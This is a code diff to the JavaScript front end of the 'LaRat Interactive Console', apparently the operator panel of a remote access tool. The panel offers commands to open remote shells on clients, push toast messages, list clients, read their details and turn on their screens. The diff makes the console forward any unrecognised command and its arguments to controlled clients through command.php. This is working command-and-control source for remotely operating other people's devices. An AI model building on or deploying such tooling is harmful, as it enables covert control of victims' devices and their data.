@@ -6,13 +6,13 @@ var greeting = "Welcome to the LaRat Interactive Console! \n\
                       ssh [clientId]  - creates remote shell on client (client pool not supported)\n\
                       toast [message] - toasts message on clients in current client array\n\
                       list            - lists clients in current client array\n\
-                      info [clientId] - lists the info of a given client";
+                      info [clientId] - lists the info of a given client\n\
+                      screenon [clientId] - turns on the specified clients screen\n";
 
 String.prototype.strip = function(char) {
     return this.replace(new RegExp("^" + char + "*"), '').
         replace(new RegExp(char + "*$"), '');
 }
-
 
 $.extend_if_has = function(desc, source, array) {
     for (var i=array.length;i--;) {
@@ -77,7 +77,13 @@ jQuery(document).ready(function($) {
         if(commandList[command]) {
           commandList[command](argArray, terminal);
         } else {
-          terminal.echo("Invalid command " + command);
+            var args = []
+            var argsParsed = argArray.slice(1, argArray.length);
+            argsParsed.forEach(function(value) {
+                    args.push(value);
+            });
+            
+           $.get("command.php?command=sendCommand&function=" + argArray[0] + "&args=" + args + "&clientId=" + clientIds[0]);
         }
     });
 });
@@ -130,7 +136,7 @@ var toast = function(args, terminal) {
 var getInfo = function(args, terminal) {
     var client = args[1];
     $.get( "command.php?command=getDetails&clientId=" + client, function( result ) {
-        var result = JSON.parse(result);
+        result = JSON.parse(result);
         if(result['status'] == 'ok') {
             var details = result['clientDetails'];
             var info = details['info'][0];
